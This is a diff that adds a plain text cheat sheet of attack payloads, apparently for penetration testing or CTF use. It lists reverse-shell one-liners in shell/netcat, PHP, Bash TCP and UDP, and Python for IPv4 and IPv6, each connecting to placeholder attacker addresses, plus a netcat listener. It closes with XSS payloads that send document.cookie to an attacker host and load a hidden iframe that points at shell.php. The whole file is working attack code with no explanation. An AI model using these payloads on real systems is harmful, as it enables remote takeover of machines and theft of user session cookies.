@@ -1,0 +1,49 @@
+===========================
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.133 4444 >/tmp/f
+===========================
+         PHP
+                          
+[+] php -r '$sock=fsockopen("ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+[+] php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+
+[+] php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
+
+[+] php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
+
+[+] php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
+[+] php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+
+===========================
+      Bash UDP
+   
+Victim:
+sh -i >& /dev/udp/10.0.0.1/4242 0>&1
+
+Listener:
+nc -u -lvp 4242
+
+===========================
+       Bash TCP
+
+[+] bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+
+[+] 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+
+[+] /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
+===========================
+       Python
+ -- ipv4
+[+] python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+-- ipv6
+[+] python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
+=========================
+     Xss
+    
+<script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444/?"+document.cookie}},1010)</script>
+
+<iframe src=http://<YOUR IP>/shell.php height=”0” width=”0”></iframe>
+
+<script>window.location='http://ip:port/cookie='+document.cookie</script>
+
